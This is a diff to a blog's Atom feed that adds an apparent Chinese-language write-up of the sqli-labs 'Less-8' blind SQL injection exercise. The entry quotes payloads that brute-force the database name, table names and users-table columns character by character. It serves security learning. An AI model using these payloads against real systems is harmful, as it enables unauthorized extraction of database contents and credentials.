@@ -6,7 +6,7 @@
   <link href="http://cxdshibaba.github.io/atom.xml" rel="self"/>
   
   <link href="http://cxdshibaba.github.io/"/>
-  <updated>2021-11-16T14:32:22.037Z</updated>
+  <updated>2021-11-19T15:05:30.029Z</updated>
   <id>http://cxdshibaba.github.io/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>less-8</title>
+    <link href="http://cxdshibaba.github.io/2021/11/19/less-8/"/>
+    <id>http://cxdshibaba.github.io/2021/11/19/less-8/</id>
+    <published>2021-11-19T14:54:24.000Z</published>
+    <updated>2021-11-19T15:05:30.029Z</updated>
+    
+    <content type="html"><![CDATA[<p>首先输入?id=1’，出现报错，说明存在漏洞注入，同时用联合查询语句都没有出现回显，说明本体为盲注，使用PyCharm爆破<br>首先写脚本，爆破库名，payload:and substr(database(),{},1)=’{}’–+<br><img src="https://s3.bmp.ovh/imgs/2021/11/40ac86564e6d5fa5.png"><br>找到库名为security<br>接着爆破表名，payload:nd substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)=’{}’–+<br><img src="https://s3.bmp.ovh/imgs/2021/11/7fbd316092ee8c20.png"><br>接着查找users里面的数据，payload:and substr((select group_concat(column_name) from information_schema.columns where table_name=’users’),{},1)=’{}’–+<br><img src="https://s3.bmp.ovh/imgs/2021/11/60b607a19434dffe.png"><br>最后查找password和username<br><img src="https://s3.bmp.ovh/imgs/2021/11/d2ccc5020876c5b0.png"><br><img src="https://s3.bmp.ovh/imgs/2021/11/9e84d0f9b2c8ea8c.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;首先输入?id=1’，出现报错，说明存在漏洞注入，同时用联合查询语句都没有出现回显，说明本体为盲注，使用PyCharm爆破&lt;br&gt;首先写脚本，爆破库名，payload:and substr(database(),{},1)=’{}’–+&lt;br&gt;&lt;img src=&quot;https</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>less-5</title>
